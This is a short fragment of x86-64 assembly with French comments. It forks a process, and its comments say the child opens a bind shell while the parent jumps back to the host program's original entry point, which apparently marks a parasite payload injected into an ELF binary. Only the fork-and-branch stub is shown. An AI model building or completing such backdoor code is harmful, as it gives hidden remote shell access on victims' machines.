
BITS 64

_start:
    ; ===== fork() =====
    xor     rax, rax
    mov     al, 57              ; syscall fork = 57
    syscall

    ; rax = 0  → fils   → bind shell
    ; rax > 0  → père   → retour à e_entry
    test    rax, rax
    jnz     retour_pere
